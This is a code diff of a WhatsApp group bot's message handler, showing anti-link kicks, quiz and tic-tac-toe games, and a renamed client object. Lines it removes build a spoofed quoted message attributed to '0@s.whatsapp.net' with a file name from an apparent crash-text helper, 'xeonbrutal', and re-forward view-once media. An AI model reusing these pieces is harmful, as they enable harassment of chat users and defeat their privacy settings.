-        Miku.sendMessage(from, {text:`\`\`\`「  Antilink System  」\`\`\`\n\n@${kice.split("@")[0]} Baka has been removed for sending Facebook link in this group!`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
-        } else {
-        }
-        
-        if (AntiLinkTelegram)
-           if (budy.includes("https://t.me/")){
-        if (AntiLinkTelegram)
-        if (!isBotAdmins) return
-        bvl = `\`\`\`「  Antilink System  」\`\`\`\n\nLink sent by Admin so no action will be taken!`
-        if (isAdmins) return reply(bvl)
-        if (m.key.fromMe) return reply(bvl)
-        if (isCreator) return reply(bvl)
-        kice = m.sender
-        await Miku.groupParticipantsUpdate(m.chat, [kice], 'remove')
-        Miku.sendMessage(from, {text:`\`\`\`「  Antilink System  」\`\`\`\n\n@${kice.split("@")[0]} Baka has been removed for sending Telegram link in this group!`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
-        } else {
-        }
-        
-        if (AntiLinkTiktok)
-           if (budy.includes("https://www.tiktok.com/")){
-        if (!isBotAdmins) return
-        bvl = `\`\`\`「  Antilink System  」\`\`\`\n\nLink sent by Admin so no action will be taken!`
-        if (isAdmins) return reply(bvl)
-        if (m.key.fromMe) return reply(bvl)
-        if (isCreator) return reply(bvl)
-        kice = m.sender
-        await Miku.groupParticipantsUpdate(m.chat, [kice], 'remove')
-        Miku.sendMessage(from, {text:`\`\`\`「  Antilink System  」\`\`\`\n\n@${kice.split("@")[0]} Baka has been removed for sending Tiktok link in this group!`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
-        } else {
-        }
-        
-        if (AntiLinkTwitter)
-           if (budy.includes("https://twitter.com/")){
-        if (!isBotAdmins) return
-        bvl = `\`\`\`「  Antilink System  」\`\`\`\n\nLink sent by Admin so no action will be taken!`
-        if (isAdmins) return reply(bvl)
-        if (m.key.fromMe) return reply(bvl)
-        if (isCreator) return reply(bvl)
-        kice = m.sender
-        await Miku.groupParticipantsUpdate(m.chat, [kice], 'remove')
-        Miku.sendMessage(from, {text:`\`\`\`「  Antilink System  」\`\`\`\n\n@${kice.split("@")[0]} Baka has been removed for sending Twitter link in this group!`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
-        } else {
-        }
-        
-        if (AntiLinkAll)
-           if (budy.includes("https://")){
-        if (!isBotAdmins) return
-        bvl = `\`\`\`「  Antilink System  」\`\`\`\n\nLink sent by Admin so no action will be taken!`
-        if (isAdmins) return reply(bvl)
-        if (m.key.fromMe) return reply(bvl)
-        if (isCreator) return reply(bvl)
-        kice = m.sender
-        await Miku.groupParticipantsUpdate(m.chat, [kice], 'remove')
-        Miku.sendMessage(from, {text:`\`\`\`「  Antilink System  」\`\`\`\n\n@${kice.split("@")[0]} Baka has been removed for sending links in this group!`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
-        } else {
-        }
-        
-const deploy = (teks) => {
-  Miku.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: global.Thumb }}}}, {})
-}
-
-const doc = { 
-key: {
-fromMe: false, 
-participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
-},
-"message": {
-"documentMessage": {
-"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
-"mimetype": "application/octet-stream",
-"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
-"fileLength": "64455",
-"pageCount": 1,
-"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
-"fileName": `${global.OwnerName}â˜£ï¸${xeonbrutal(prefix)}`,
-"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
-}}
-}
-
-const xezy = { 
-key: {
-fromMe: false, 
-participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "14169948404-1305080833@g.us" } : {}) 
-},
-"contextInfo": {
-"stanzaId": "3EB0382EDBB2",
-"externalAdReply": {
-"previewType": "PHOTO",
-"showAdAttribution": true,
-"sourceUrl": websitex,
-"thumbnailUrl": 'https://i.ibb.co/txS3dDZ/Screenshot-2022-1030-154916.jpg', 
-"thumbnail": xeonbugpic,
-}}}
-
-const bhosdike = (teks) => {
- Miku.sendMessage(m.chat, { image: xeonbugpic, caption: wm, contextInfo:{"externalAdReply": {"title": BotName,"body": global.OwnerName,
-previewType: "PHOTO",
-showAdAttribution: true,
-sourceUrl: websitex,
-thumbnailUrl: 'https://i.ibb.co/txS3dDZ/Screenshot-2022-1030-154916.jpg', 
-thumbnail: xeonbugpic,
-}
-}}, { quoted:xezy})
-}
+                //auto reply by xeon
+  //if (Autoreply) //remove forwad slashes to make it autoreply on off
+        for (let anji of xeonysticker){
+				if (budy === anji){
+					result = fs.readFileSync(`./XeonMedia/sticker/${anji}.webp`)
+					XeonBotInc.sendMessage(m.chat, { sticker: result }, { quoted: m })
+					}
+			}
+			  //if (Autoreply) //remove forwad slashes to make it autoreply on off
+			for (let anju of xeonyaudio){
+				if (budy === anju){
+					result = fs.readFileSync(`./XeonMedia/audio/${anju}.mp3`)
+					XeonBotInc.sendMessage(m.chat, { audio: result, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
+					}
+			}
+			  //if (Autoreply) //remove forwad slashes to make it autoreply on off
+			for (let anjh of xeonyimage){
+				if (budy === anjh){
+					result = fs.readFileSync(`./XeonMedia/image/${anjh}.jpg`)
+					XeonBotInc.sendMessage(m.chat, { image: result }, { quoted: m })
+					}
+			}
+			  //if (Autoreply) //remove forwad slashes to make it autoreply on off
+					for (let anjh of xeonyvideo){
+				if (budy === anjh){
+					result = fs.readFileSync(`./XeonMedia/video/${anjh}.mp4`)
+					XeonBotInc.sendMessage(m.chat, { video: result }, { quoted: m })
+					}
+				  }
 
 //emoji 
 const emote = (satu, dua) => {
@@ -989,524 +766,374 @@ const emoji = new EmojiAPI();
 emoji.get(satu)
 .then(emoji => {
 const buttons = [{buttonId: "y", buttonText: {displayText:satu}, type: 1}]
-const buttonMessage = {image: {url: emoji.images[dua].url},caption: "Here you go!",footerText: `${BotNane}`,buttons: buttons,headerType: 4}
-Miku.sendMessage(from, buttonMessage, {quoted:m})
+const buttonMessage = {image: {url: emoji.images[dua].url},caption: "Here you go!",footerText: `${botname}`,buttons: buttons,headerType: 4}
+XeonBotInc.sendMessage(from, buttonMessage, {quoted:m})
 })
 } catch (e) {
-m.reply("Emoji error, please enter another emoji\nNOTE : Just enter 1 emoji")
+reply("Emoji error, please enter another emoji\nNOTE : Just enter 1 emoji")
 }
 }
-	
-	
-	
-	
-	
-	
-	
-	
-	
-if (m.mtype == 'viewOnceMessage') {
-	if (!db.data.chats[m.chat].antionce) return
- teks = `「 *Anti ViewOnce Message* 」
-${themeemoji} Name : ${m.pushName}
-${themeemoji} User : @${m.sender.split("@")[0]}
-${themeemoji} Clock : ${moment.tz('Asia/Kolkata').format('HH:mm:ss')} 
-${themeemoji} Date : ${moment.tz('Asia/Kolkata').format('DD/MM/YYYY')}
-${themeemoji} MessageType : ${m.mtype}`
-Miku.sendTextWithMentions(m.chat, teks, m)
-await sleep(500)
-m.copyNForward(m.chat, true, { readViewOnce: true }).catch(_ => reply(`Maybe it's been opened by a bot`))
-}
 
-
-if (!Miku.public) {
-if (!m.key.fromMe) return
-}
-
-
-setInterval(() => {
-fs.writeFileSync('./src/database.json', JSON.stringify(global.db, null, 2))
-}, 60 * 1000)
-
-// reset limit every 12 hours
-let cron = require('node-cron')
-    cron.schedule('00 12 * * *', () => {
-    let user = Object.keys(global.db.users)
-    let limitUser = isRakyat ? global.limitawal.rakyat : global.limitawal.free
-    for (let jid of user) global.db.users[jid].limit = limitUser
-    console.log('Reseted Limit')
-    }, {
-    scheduled: true,
-    timezone: "Asia/Kolkata"
-    })
-
-    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
-      kuis = true
-      jawaban = tebaklagu[m.sender.split('@')[0]]
-      if (budy.toLowerCase() == jawaban) {
-      await Miku.sendImage(m.chat, 'https://telegra.ph/file/3971381526386eb43b41e.jpg', 'Wah Pinter banget kamu kak.\n\nJawabanmu benar 👏.', m)
-      delete tebaklagu[m.sender.split('@')[0]]
-      } else reply('*Tetott 🤭*')
+      //Mute Chat\\
+      if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
+      return
       }
-
-      if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
-        kuis = true
-        jawaban = tebakgambar[m.sender.split('@')[0]]
-        if (budy.includes(jawaban)) {
-        await Miku.sendImage(m.chat, 'https://telegra.ph/file/3971381526386eb43b41e.jpg', 'Wah Pinter banget kamu kak.\n\nJawabanmu benar 👏.', m)
-        delete tebakgambar[m.sender.split('@')[0]]
-        }else reply('*Tetott 🤭**')
+        
+        //media detect \\
+		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
+		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
+		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
+		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
+        
+        //Respon Cmd with media\\
+        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
+        let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
+        let { text, mentionedJid } = hash
+        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
+            userJid: XeonBotInc.user.id,
+            quoted: m.quoted && m.quoted.fakeObj
+        })
+        messages.key.fromMe = areJidsSameUser(m.sender, XeonBotInc.user.id)
+        messages.key.id = m.key.id
+        messages.pushName = m.pushName
+        if (m.isGroup) messages.participant = m.sender
+        let msg = {
+            ...chatUpdate,
+            messages: [proto.WebMessageInfo.fromObject(messages)],
+            type: 'append'
+        }
+        XeonBotInc.ev.emit('messages.upsert', msg)
+        }
+	    
+	if (('family100'+m.chat in _family100) && isCmd) {
+            kuis = true
+            let room = _family100['family100'+m.chat]
+            let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
+            let isSurender = /^((me)?give up|surr?ender)$/i.test(m.text)
+            if (!isSurender) {
+                let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
+                if (room.terjawab[index]) return !0
+                room.terjawab[index] = m.sender
+            }
+            let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
+            let caption = `
+Answer The Following Questions :\n${room.soal}\n\n\nThere Is ${room.jawaban.length} Answer ${room.jawaban.find(v => v.includes(' ')) ? `(Some Answers Have Spaces)` : ''}
+${isWin ? `All Answers Answered` : isSurender ? 'Surrender!' : ''}
+${Array.from(room.jawaban, (jawaban, index) => {
+        return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
+    }).filter(v => v).join('\n')}
+    ${isSurender ? '' : `Perfect Player`}`.trim()
+            XeonBotInc.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
+            if (isWin || isSurender) delete _family100['family100'+m.chat]
         }
 
-        if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
-          kuis = true
-          jawaban = tebakkata[m.sender.split('@')[0]]
-          if (budy.includes(jawaban)) {
-          await Miku.sendImage(m.chat, 'https://telegra.ph/file/3971381526386eb43b41e.jpg', 'Wah Pinter banget kamu kak.\n\nJawabanmu benar 👏.', m)
-          delete tebakkata[m.sender.split('@')[0]]
-          } else reply('*Tetott 🤭*')
-          }
-          
-          if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
-          kuis = true
-          jawaban = caklontong[m.sender.split('@')[0]]
-          deskripsi = caklontong_desk[m.sender.split('@')[0]]
-          if (budy.includes(jawaban)) {
-          await Miku.sendImage(m.chat, 'https://telegra.ph/file/3971381526386eb43b41e.jpg', 'Wah Pinter banget kamu kak.\n\nJawabanmu benar 👏.', m)
-          delete caklontong[m.sender.split('@')[0]]
-          delete caklontong_desk[m.sender.split('@')[0]]
-          } else reply('*Tetott 🤭*')
-          }
-          
-          if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
-          kuis = true
-          jawaban = tebakkalimat[m.sender.split('@')[0]]
-          if (budy.includes(jawaban)) {
-          await Miku.sendImage(m.chat, 'https://telegra.ph/file/3971381526386eb43b41e.jpg', 'Wah Pinter banget kamu kak.\n\nJawabanmu benar 👏.', m)
-          delete tebakkalimat[m.sender.split('@')[0]]
-          } else reply('*Tetott 🤭*')
-          }
-          
-          if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
-          kuis = true
-          jawaban = tebaklirik[m.sender.split('@')[0]]
-          if (budy.toLowerCase() == jawaban) {
-          await Miku.sendImage(m.chat, 'https://telegra.ph/file/3971381526386eb43b41e.jpg', 'Wah Pinter banget kamu kak.\n\nJawabanmu benar 👏.', m)
-          delete tebaklirik[m.sender.split('@')[0]]
-          } else reply('*Tetott 🤭*')
-          }
-          
-          if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
-          kuis = true
-          jawaban = tebaktebakan[m.sender.split('@')[0]]
-          if (budy.toLowerCase() == jawaban) {
-        await Miku.sendImage(m.chat, 'https://telegra.ph/file/3971381526386eb43b41e.jpg', 'Wah Pinter banget kamu kak.\n\nJawabanmu benar 👏.', m)
-          delete tebaktebakan[m.sender.split('@')[0]]
-          } else reply('*Tetott 🤭*')
-          }
-          
-          if (('family100'+m.chat in _family100)) {
-          kuis = true
-          let room = _family100['family100'+m.chat]
-          let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
-          let isSurender = /^((me)?nyerah|surr?ender|surrender)$/i.test(m.text)
-          if (!isSurender) {
-          let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
-          if (room.terjawab[index]) return !0
-          room.terjawab[index] = m.sender
-          }
-          let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
-          let caption = `
-          ᴊᴀᴡᴀʙʟᴀʜ ᴘᴇʀᴛᴀɴʏᴀᴀɴ ʙᴇʀɪᴋᴜᴛ ɪɴɪ. :\n${room.soal}\n\n\nᴀᴅᴀ ${room.jawaban.length} ᴊᴀᴡᴀʙᴀɴ ${room.jawaban.find(v => v.includes(' ')) ? `(ʙᴇʙᴇʀᴀᴘᴀ ᴊᴀᴡᴀʙᴀɴ ᴍᴇᴍɪʟɪᴋɪ sᴘᴀsɪ)` : ''}
-          ${isWin ? `sᴇᴍᴜᴀ ᴊᴀᴡᴀʙᴀɴ ᴛᴇʟᴀʜ ᴛᴇʀᴊᴀᴡᴀʙ` : isSurender ? 'Menyerah!' : ''}
-          ${Array.from(room.jawaban, (jawaban, index) => {
-          return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
-          }).filter(v => v).join('\n')}
-          ${isSurender ? '' : `Perfect Player`}`.trim()
-          Miku.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
-          if (isWin || isSurender) delete _family100['family100'+m.chat]
-          }
-          
-          
-          this.suit = this.suit ? this.suit : {}
-          let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
-          if (roof) {
-          let win = ''
-          let tie = false
-          if (m.sender == roof.p2 && /^(acc(ept)?|Setuju|gas|oke?|reject|Males|ogah|no(pe)?can|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
-          if (/^(reject|Males|ogah|n|no(pe)?can)/i.test(m.text)) {
-          Miku.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} Menolak suit, Suit Telah dibatalkan!`, m)
-          delete this.suit[roof.id]
-          return !0
-          }
-          roof.status = 'play'
-          roof.asal = m.chat
-          clearTimeout(roof.waktu)
-          
-          Miku.sendText(m.chat, `Pilihan Suit Telah Dikirimkan!
-          @${roof.p.split`@`[0]} dan 
-          @${roof.p2.split`@`[0]}
-          Silahkan Cek Chat Pribadi Kalian"
-          Click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
-          if (!roof.pilih) Miku.sendText(roof.p, `Tolong Pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
-          if (!roof.pilih2) Miku.sendText(roof.p2, `Tolong Pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
-          roof.waktu_milih = setTimeout(() => {
-          if (!roof.pilih && !roof.pilih2) Miku.sendText(m.chat, `Kedua Player Tidak Mau bermain,\nSuit Telah dibatalkan`)
-          else if (!roof.pilih || !roof.pilih2) {
-          win = !roof.pilih ? roof.p2 : roof.p
-          Miku.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} Tidak Memilih, Game Berakhir!`, m)
-          }
-          delete this.suit[roof.id]
-          return !0
-          }, roof.timeout)
-          }
-          let jwb = m.sender == roof.p
-          let jwb2 = m.sender == roof.p2
-          let g = /gunting/i
-          let b = /batu/i
-          let k = /kertas/i
-          let reg = /^(gunting|batu|kertas)/i
-          if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
-          roof.pilih = reg.exec(m.text.toLowerCase())[0]
-          roof.text = m.text
-          reply(`Kamu Telah memilih ${m.text} ${!roof.pilih2 ? `\n\nTunggu Lawanmu Sedang Memilih...` : ''}`)
-          if (!roof.pilih2) Miku.sendText(roof.p2, '_Pihak Lawan Telah Memilih!_\nSekarang Giliranmu!', 0)
-          }
-          if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
-          roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
-          roof.text2 = m.text
-          reply(`Kamu Telah memilih ${m.text} ${!roof.pilih ? `\n\nTunggu Lawanmu Sedang Memilih...` : ''}`)
-          if (!roof.pilih) Miku.sendText(roof.p, '_Pihak Lawan Telah Memilih!_\nSekarang Giliranmu!', 0)
-          }
-          let stage = roof.pilih
-          let stage2 = roof.pilih2
-          
-          if (roof.pilih && roof.pilih2) {
-            clearTimeout(roof.waktu_milih)
-            if (b.test(stage) && g.test(stage2)) win = roof.p
-            else if (b.test(stage) && k.test(stage2)) win = roof.p2
-            else if (g.test(stage) && k.test(stage2)) win = roof.p
-            else if (g.test(stage) && b.test(stage2)) win = roof.p2
-            else if (k.test(stage) && b.test(stage2)) win = roof.p
-            else if (k.test(stage) && g.test(stage2)) win = roof.p2
-            else if (stage == stage2) tie = true
-            Miku.sendText(roof.asal, `_*Suit Results*_${tie ? '\nDraw Bang!' : ''}
-            @${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}
-            @${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost \n`}
-            `.trim(), m, { mentions: [roof.p, roof.p2] })
-            delete this.suit[roof.id]
-            }
-            }
+        if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
+            kuis = true
+            jawaban = tebaklagu[m.sender.split('@')[0]]
+            if (budy.toLowerCase() == jawaban) {
+                await XeonBotInc.sendButtonText(m.chat, [{ buttonId: 'guess song', buttonText: { displayText: 'Guess The Song' }, type: 1 }], `🎮 Guess The Music 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Press The Button Below`, XeonBotInc.user.name, m)
+                delete tebaklagu[m.sender.split('@')[0]]
+            } else reply('*Wrong Answer!*')
+        }
 
-            async function cerpen (category) {
-              return new Promise((resolve, reject) => {
-                  let title = category.toLowerCase().replace(/[()*]/g, "")
-                  let judul = title.replace(/\s/g, "-")
-                  let page = Math.floor(Math.random() * 5)
-                  axios.get('http://cerpenmu.com/category/cerpen-'+judul+'/page/'+page)
-                  .then((get) => {
-                      let $ = cheerio.load(get.data)
-                      let link = []
-                      $('article.post').each(function (a, b) {
-                          link.push($(b).find('a').attr('href'))
-                      })
-                      let random = link[Math.floor(Math.random() * link.length)]
-                      axios.get(random)
-                      .then((res) => {
-                          let $$ = cheerio.load(res.data)
-                          let hasil = {
-                              title: $$('#content > article > h1').text(),
-                              author: $$('#content > article').text().split('Short Story: ')[1].split('Category: ')[0],
-                              kategori: $$('#content > article').text().split('Category: ')[1].split('\n')[0],
-                              lolos: $$('#content > article').text().split('Passed moderation on: ')[1].split('\n')[0],
-                              cerita: $$('#content > article > p').text()
-                          }
-                          resolve(hasil)
-                      })
-                  })
-              })
-          }
-
-          if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
+        if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
             kuis = true
             jawaban = kuismath[m.sender.split('@')[0]]
             if (budy.toLowerCase() == jawaban) {
-            await reply(`「 *Math Quiz* 」\n\n 🎉 Correct Answer 🎉\n\nWant to play again? send ${prefix}math mode`)
-            delete kuismath[m.sender.split('@')[0]]
-            } else reply('*Wrong answer!*')
-            }
+                await reply(`🎮 Math Quiz 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Send ${prefix}math mode`)
+                delete kuismath[m.sender.split('@')[0]]
+            } else reply('*Wrong Answer!*')
+        }
 
-            if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.sticker)) {
-              let hash = global.db.sticker[m.msg.fileSha256.toString('base64')]
-              let { text, mentionedJid } = hash
-              let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
-              userJid: Miku.user.id,
-              quoted: m.quoted && m.quoted.fakeObj
-              })
-              messages.key.fromMe = areJidsSameUser(m.sender, Miku.user.id)
-              messages.key.id = m.key.id
-              messages.pushName = m.pushName
-              if (m.isGroup) messages.participant = m.sender
-              let msg = {
-              ...chatUpdate,
-              messages: [proto.WebMessageInfo.fromObject(messages)],
-              type: 'append'
-              }
-              Miku.ev.emit('messages.upsert', msg)
-              }
-          
+        if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
+            kuis = true
+            jawaban = tebakgambar[m.sender.split('@')[0]]
+            if (budy.toLowerCase() == jawaban) {
+                await XeonBotInc.sendButtonText(m.chat, [{ buttonId: 'guess picture', buttonText: { displayText: 'Guess The Picture' }, type: 1 }], `🎮 Guess The Picture 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Press The Button Below`, XeonBotInc.user.name, m)
+                delete tebakgambar[m.sender.split('@')[0]]
+            } else reply('*Wrong Answer!*')
+        }
 
+        if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
+            kuis = true
+            jawaban = tebakkata[m.sender.split('@')[0]]
+            if (budy.toLowerCase() == jawaban) {
+                await XeonBotInc.sendButtonText(m.chat, [{ buttonId: 'guess word', buttonText: { displayText: 'Guess The Word' }, type: 1 }], `🎮 Guess The Word 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Press The Button Below`, XeonBotInc.user.name, m)
+                delete tebakkata[m.sender.split('@')[0]]
+            } else reply('*Wrong Answer!*')
+        }
 
-              const textImg = (teks) => {
-                Miku.sendMessage(m.chat, { text :teks, }, {quoted: m, thumbnail: fs.readFileSync('./Assets/pic4.jpg')}) 
+        if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
+            kuis = true
+            jawaban = caklontong[m.sender.split('@')[0]]
+	    deskripsi = caklontong_desk[m.sender.split('@')[0]]
+            if (budy.toLowerCase() == jawaban) {
+                await XeonBotInc.sendButtonText(m.chat, [{ buttonId: 'guess blank', buttonText: { displayText: 'Guess The Blank' }, type: 1 }], `🎮 Guess The Blank 🎮\n\nCorrect Answer 🎉\n*${deskripsi}*\n\nWant To Play Again? Press The Button Below`, XeonBotInc.user.name, m)
+                delete caklontong[m.sender.split('@')[0]]
+		delete caklontong_desk[m.sender.split('@')[0]]
+            } else reply('*Wrong Answer!*')
+        }
+
+        if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
+            kuis = true
+            jawaban = tebakkalimat[m.sender.split('@')[0]]
+            if (budy.toLowerCase() == jawaban) {
+                await XeonBotInc.sendButtonText(m.chat, [{ buttonId: 'guess sentence', buttonText: { displayText: 'Guess The Sentence' }, type: 1 }], `🎮 Guess The Sentence 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Press The Button Below`, XeonBotInc.user.name, m)
+                delete tebakkalimat[m.sender.split('@')[0]]
+            } else reply('*Wrong Answer!*')
+        }
+
+        if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
+            kuis = true
+            jawaban = tebaklirik[m.sender.split('@')[0]]
+            if (budy.toLowerCase() == jawaban) {
+                await XeonBotInc.sendButtonText(m.chat, [{ buttonId: 'guess lyrics', buttonText: { displayText: 'Guess The Lyrics' }, type: 1 }], `🎮 Guess The Lyrics 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Press The Button Below`, XeonBotInc.user.name, m)
+                delete tebaklirik[m.sender.split('@')[0]]
+            } else reply('*Wrong Answer!*')
+        }
+	    
+	if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
+            kuis = true
+            jawaban = tebaktebakan[m.sender.split('@')[0]]
+            if (budy.toLowerCase() == jawaban) {
+                await XeonBotInc.sendButtonText(m.chat, [{ buttonId: 'guess riddle', buttonText: { displayText: 'Guess The Riddle' }, type: 1 }], `🎮 Guess The Riddle 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Press The Button Below`, XeonBotInc.user.name, m)
+                delete tebaktebakan[m.sender.split('@')[0]]
+            } else reply('*Wrong Answer!*')
+        }
+        
+        //TicTacToe\\
+	    this.game = this.game ? this.game : {}
+	    let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
+	    if (room) {
+	    let ok
+	    let isWin = !1
+	    let isTie = !1
+	    let isSurrender = !1
+	    //reply(`[DEBUG]\n${parseInt(m.text)}`)
+	    if (!/^([1-9]|(me)?give up|surr?ender|off|skip)$/i.test(m.text)) return
+	    isSurrender = !/^[1-9]$/.test(m.text)
+	    if (m.sender !== room.game.currentTurn) { 
+	    if (!isSurrender) return !0
+	    }
+	    if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
+	    reply({
+	    '-3': 'Game Has Ended',
+	    '-2': 'Invalid',
+	    '-1': 'Invalid Position',
+	    0: 'Invalid Position',
+	    }[ok])
+	    return !0
+	    }
+	    if (m.sender === room.game.winner) isWin = true
+	    else if (room.game.board === 511) isTie = true
+	    let arr = room.game.render().map(v => {
+	    return {
+	    X: '❌',
+	    O: '⭕',
+	    1: '1️⃣',
+	    2: '2️⃣',
+	    3: '3️⃣',
+	    4: '4️⃣',
+	    5: '5️⃣',
+	    6: '6️⃣',
+	    7: '7️⃣',
+	    8: '8️⃣',
+	    9: '9️⃣',
+	    }[v]
+	    })
+	    if (isSurrender) {
+	    room.game._currentTurn = m.sender === room.game.playerX
+	    isWin = true
+	    }
+	    let winner = isSurrender ? room.game.currentTurn : room.game.winner
+	    let str = `Room ID: ${room.id}
+
+${arr.slice(0, 3).join('')}
+${arr.slice(3, 6).join('')}
+${arr.slice(6).join('')}
+
+${isWin ? `@${winner.split('@')[0]} Won!` : isTie ? `Game Over` : `Turn ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
+❌: @${room.game.playerX.split('@')[0]}
+⭕: @${room.game.playerO.split('@')[0]}
+
+Typed *surrender* to surrender and admited defeat`
+	    if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
+	    room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
+	    if (room.x !== room.o) await XeonBotInc.sendText(room.x, str, m, { mentions: parseMention(str) } )
+	    await XeonBotInc.sendText(room.o, str, m, { mentions: parseMention(str) } )
+	    if (isTie || isWin) {
+	    delete this.game[room.id]
+	    }
+	    }
+
+        //Suit PvP\\
+	    this.suit = this.suit ? this.suit : {}
+	    let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
+	    if (roof) {
+	    let win = ''
+	    let tie = false
+	    if (m.sender == roof.p2 && /^(acc(ept)?|accept|yes|okay?|reject|no|later|nope(k.)?yes|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
+	    if (/^(reject|no|later|n|nope(k.)?yes)/i.test(m.text)) {
+	    XeonBotInc.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} Refuse Suit, Suit Canceled`, m)
+	    delete this.suit[roof.id]
+	    return !0
+	    }
+	    roof.status = 'play'
+	    roof.asal = m.chat
+	    clearTimeout(roof.waktu)
+	    //delete roof[roof.id].waktu
+	    XeonBotInc.sendText(m.chat, `Suit Has Been Sent To Chat
+
+@${roof.p.split`@`[0]} dan 
+@${roof.p2.split`@`[0]}
+
+Please Choose A Suit In The Respective Chat"
+Click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
+	    if (!roof.pilih) XeonBotInc.sendText(roof.p, `Please Select \n\Rock🗿\nPaper📄\nScissors✂️`, m)
+	    if (!roof.pilih2) XeonBotInc.sendText(roof.p2, `Please Select \n\nRock🗿\nPaper📄\nScissors✂️`, m)
+	    roof.waktu_milih = setTimeout(() => {
